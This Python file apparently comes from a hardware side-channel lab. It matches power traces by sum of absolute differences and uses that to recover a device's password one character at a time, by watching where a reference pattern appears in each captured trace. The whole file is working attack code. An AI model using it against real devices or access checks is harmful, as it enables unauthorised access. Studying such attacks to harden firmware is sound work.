def find_offset_SAD(ref, target_trace, threshold):
    def calc_SAD(a1, a2):
        SAD = 0
        for v1, v2 in zip(a1, a2):
            SAD += abs(v1 - v2)
        return SAD
    for offset in range(len(target_trace) - len(ref)):
        if calc_SAD(ref, target_trace[offset:offset+len(ref)]) < threshold:
            return offset
        
def guess_password_SAD(cap_pass_trace, find_offset, ref, original_offset, threshold, target):
    trylist = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""
    for i in range(5):
        for c in trylist:
            next_pass = password + c + "\n"
            trace = cap_pass_trace(next_pass)
            success_resp = "Access granted, Welcome!"
            resp = target.read(len(success_resp))
            if "granted" in resp:
                print("Access granted: password = ", next_pass)
                done = 1
                return next_pass
            offset = find_offset(ref, trace, threshold)
            if offset is None:
                print("Threshold likely too low")
                return None
            elif offset == 0:
                print("Threshold likely too high")
                return None
            if offset > original_offset:
                original_offset = offset
                password+=c
                print("Success, password now: ", password)
                break
